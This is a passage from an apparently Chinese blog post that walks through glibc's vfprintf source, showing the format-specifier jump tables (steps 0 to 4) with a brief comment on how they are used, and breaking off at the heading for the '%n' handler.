class="code"><pre><span class="line"><span class="meta"># <span class="keyword">define</span> vfprintf __vfprintf_internal</span></span><br></pre></td></tr></table></figure><p>还有一个显然是占位符的一个表，看样子,还是有使用顺序的,对应的顺序里找对应的表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> STEP0_3_TABLE      \</span></span><br><span class="line"><span class="meta">    <span class="comment">/* Step 0: at the beginning.  */</span>      \</span></span><br><span class="line"><span class="meta">    static JUMP_TABLE_TYPE step0_jumps[31] =      \</span></span><br><span class="line"><span class="meta">    &#123;      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),      \</span></span><br><span class="line"><span class="meta">      REF (flag_space),<span class="comment">/* for &#x27; &#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (flag_plus),<span class="comment">/* for &#x27;+&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (flag_minus),<span class="comment">/* for &#x27;-&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (flag_hash),<span class="comment">/* for &#x27;&lt;hash&gt;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (flag_zero),<span class="comment">/* for &#x27;0&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (flag_quote),<span class="comment">/* for &#x27;\&#x27;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (width_asterics),<span class="comment">/* for &#x27;*&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (width),<span class="comment">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (precision),<span class="comment">/* for &#x27;.&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_half),<span class="comment">/* for &#x27;h&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_long),<span class="comment">/* for &#x27;l&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_longlong),<span class="comment">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_size_t),<span class="comment">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_percent),<span class="comment">/* for &#x27;%&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_integer),<span class="comment">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unsigned),<span class="comment">/* for &#x27;u&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_octal),<span class="comment">/* for &#x27;o&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_hexa),<span class="comment">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_float),<span class="comment">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_character),<span class="comment">/* for &#x27;c&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_string),<span class="comment">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_pointer),<span class="comment">/* for &#x27;p&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_number),<span class="comment">/* for &#x27;n&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_strerror),<span class="comment">/* for &#x27;m&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_wcharacter),<span class="comment">/* for &#x27;C&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_floathex),<span class="comment">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_ptrdiff_t),      <span class="comment">/* for &#x27;t&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_intmax_t),       <span class="comment">/* for &#x27;j&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (flag_i18n),<span class="comment">/* for &#x27;I&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_binary),<span class="comment">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">    &#125;;      \</span></span><br><span class="line"><span class="meta">    <span class="comment">/* Step 1: after processing width.  */</span>      \</span></span><br><span class="line"><span class="meta">    static JUMP_TABLE_TYPE step1_jumps[31] =      \</span></span><br><span class="line"><span class="meta">    &#123;      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27; &#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;+&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;-&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;&lt;hash&gt;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;0&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;\&#x27;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;*&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (precision),<span class="comment">/* for &#x27;.&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_half),<span class="comment">/* for &#x27;h&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_long),<span class="comment">/* for &#x27;l&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_longlong),<span class="comment">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_size_t),<span class="comment">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_percent),<span class="comment">/* for &#x27;%&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_integer),<span class="comment">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unsigned),<span class="comment">/* for &#x27;u&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_octal),<span class="comment">/* for &#x27;o&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_hexa),<span class="comment">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_float),<span class="comment">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_character),<span class="comment">/* for &#x27;c&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_string),<span class="comment">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_pointer),<span class="comment">/* for &#x27;p&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_number),<span class="comment">/* for &#x27;n&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_strerror),<span class="comment">/* for &#x27;m&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_wcharacter),<span class="comment">/* for &#x27;C&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_floathex),<span class="comment">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_ptrdiff_t),      <span class="comment">/* for &#x27;t&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_intmax_t),       <span class="comment">/* for &#x27;j&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),       <span class="comment">/* for &#x27;I&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_binary),<span class="comment">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">    &#125;;      \</span></span><br><span class="line"><span class="meta">    <span class="comment">/* Step 2: after processing precision.  */</span>      \</span></span><br><span class="line"><span class="meta">    static JUMP_TABLE_TYPE step2_jumps[31] =      \</span></span><br><span class="line"><span class="meta">    &#123;      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27; &#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;+&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;-&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;&lt;hash&gt;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;0&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;\&#x27;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;*&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;.&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_half),<span class="comment">/* for &#x27;h&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_long),<span class="comment">/* for &#x27;l&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_longlong),<span class="comment">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_size_t),<span class="comment">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_percent),<span class="comment">/* for &#x27;%&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_integer),<span class="comment">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unsigned),<span class="comment">/* for &#x27;u&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_octal),<span class="comment">/* for &#x27;o&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_hexa),<span class="comment">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_float),<span class="comment">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_character),<span class="comment">/* for &#x27;c&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_string),<span class="comment">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_pointer),<span class="comment">/* for &#x27;p&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_number),<span class="comment">/* for &#x27;n&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_strerror),<span class="comment">/* for &#x27;m&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_wcharacter),<span class="comment">/* for &#x27;C&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_floathex),<span class="comment">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_ptrdiff_t),      <span class="comment">/* for &#x27;t&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_intmax_t),       <span class="comment">/* for &#x27;j&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),       <span class="comment">/* for &#x27;I&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_binary),<span class="comment">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">    &#125;;      \</span></span><br><span class="line"><span class="meta">    <span class="comment">/* Step 3a: after processing first &#x27;h&#x27; modifier.  */</span>      \</span></span><br><span class="line"><span class="meta">    static JUMP_TABLE_TYPE step3a_jumps[31] =      \</span></span><br><span class="line"><span class="meta">    &#123;      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27; &#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;+&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;-&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;&lt;hash&gt;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;0&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;\&#x27;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;*&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;.&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_halfhalf),<span class="comment">/* for &#x27;h&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;l&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_percent),<span class="comment">/* for &#x27;%&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_integer),<span class="comment">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unsigned),<span class="comment">/* for &#x27;u&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_octal),<span class="comment">/* for &#x27;o&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_hexa),<span class="comment">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;c&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;p&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_number),<span class="comment">/* for &#x27;n&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;m&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;C&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),       <span class="comment">/* for &#x27;t&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),       <span class="comment">/* for &#x27;j&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),       <span class="comment">/* for &#x27;I&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_binary),<span class="comment">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">    &#125;;      \</span></span><br><span class="line"><span class="meta">    <span class="comment">/* Step 3b: after processing first &#x27;l&#x27; modifier.  */</span>      \</span></span><br><span class="line"><span class="meta">    static JUMP_TABLE_TYPE step3b_jumps[31] =      \</span></span><br><span class="line"><span class="meta">    &#123;      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27; &#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;+&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;-&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;&lt;hash&gt;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;0&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;\&#x27;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;*&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;.&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;h&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (mod_longlong),<span class="comment">/* for &#x27;l&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_percent),<span class="comment">/* for &#x27;%&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_integer),<span class="comment">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unsigned),<span class="comment">/* for &#x27;u&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_octal),<span class="comment">/* for &#x27;o&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_hexa),<span class="comment">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_float),<span class="comment">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_character),<span class="comment">/* for &#x27;c&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_string),<span class="comment">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_pointer),<span class="comment">/* for &#x27;p&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_number),<span class="comment">/* for &#x27;n&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_strerror),<span class="comment">/* for &#x27;m&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_wcharacter),<span class="comment">/* for &#x27;C&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_floathex),<span class="comment">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),       <span class="comment">/* for &#x27;t&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),       <span class="comment">/* for &#x27;j&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),       <span class="comment">/* for &#x27;I&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_binary),<span class="comment">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STEP4_TABLE      \</span></span><br><span class="line"><span class="meta">    <span class="comment">/* Step 4: processing format specifier.  */</span>      \</span></span><br><span class="line"><span class="meta">    static JUMP_TABLE_TYPE step4_jumps[31] =      \</span></span><br><span class="line"><span class="meta">    &#123;      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27; &#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;+&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;-&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;&lt;hash&gt;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;0&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;\&#x27;&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;*&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;1&#x27;...&#x27;9&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;.&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;h&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;l&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;L&#x27;, &#x27;q&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),<span class="comment">/* for &#x27;z&#x27;, &#x27;Z&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_percent),<span class="comment">/* for &#x27;%&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_integer),<span class="comment">/* for &#x27;d&#x27;, &#x27;i&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unsigned),<span class="comment">/* for &#x27;u&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_octal),<span class="comment">/* for &#x27;o&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_hexa),<span class="comment">/* for &#x27;X&#x27;, &#x27;x&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_float),<span class="comment">/* for &#x27;E&#x27;, &#x27;e&#x27;, &#x27;F&#x27;, &#x27;f&#x27;, &#x27;G&#x27;, &#x27;g&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_character),<span class="comment">/* for &#x27;c&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_string),<span class="comment">/* for &#x27;s&#x27;, &#x27;S&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_pointer),<span class="comment">/* for &#x27;p&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_number),<span class="comment">/* for &#x27;n&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_strerror),<span class="comment">/* for &#x27;m&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_wcharacter),<span class="comment">/* for &#x27;C&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_floathex),<span class="comment">/* for &#x27;A&#x27;, &#x27;a&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),       <span class="comment">/* for &#x27;t&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),       <span class="comment">/* for &#x27;j&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_unknown),       <span class="comment">/* for &#x27;I&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">      REF (form_binary),<span class="comment">/* for &#x27;B&#x27;, &#x27;b&#x27; */</span>      \</span></span><br><span class="line"><span class="meta">    &#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="LABEL-form-number"><a href="#LABEL-form-number" class="headerlink" title="LABEL (form_number)"></a>LABEL (form_number)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span 